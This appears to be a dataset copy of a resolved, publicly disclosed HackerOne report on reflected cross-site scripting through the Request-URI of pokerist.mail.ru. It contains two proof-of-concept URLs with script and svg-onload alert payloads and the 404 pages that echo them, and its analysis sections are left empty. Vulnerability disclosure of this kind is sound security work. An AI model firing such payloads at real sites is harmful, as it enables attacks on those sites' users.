---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '178253'
original_report_id: '178253'
title: '[pokerist.mail.ru] XSS Request-URI'
weakness: Cross-site Scripting (XSS) - Generic
team_handle: mailru
created_at: '2016-10-26T17:29:13.392Z'
disclosed_at: '2017-03-02T13:18:36.671Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 9
tags:
- hackerone
- cross-site-scripting-xss-generic
---

# [pokerist.mail.ru] XSS Request-URI

## Metadata

- HackerOne Report ID: 178253
- Weakness: Cross-site Scripting (XSS) - Generic
- Program: mailru
- Disclosed At: 2017-03-02T13:18:36.671Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

**PoC** (FireFox):
```
https://pokerist.mail.ru/%3Cscript%3Ealert(document.domain)%3C/script%3E
https://pokerist.mail.ru/%3Csvg%20onload=alert(document.domain)%3E
```

**HTTP Response**:
```html
<h1>Error 404</h1>
<p>Unable to resolve the request "<script>alert(document.domain)</script>".</p>
```
```html
<h1>Error 404</h1>
<p>The system is unable to find the requested action "<svg onload=alert(document.domain)>".</p>
```

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
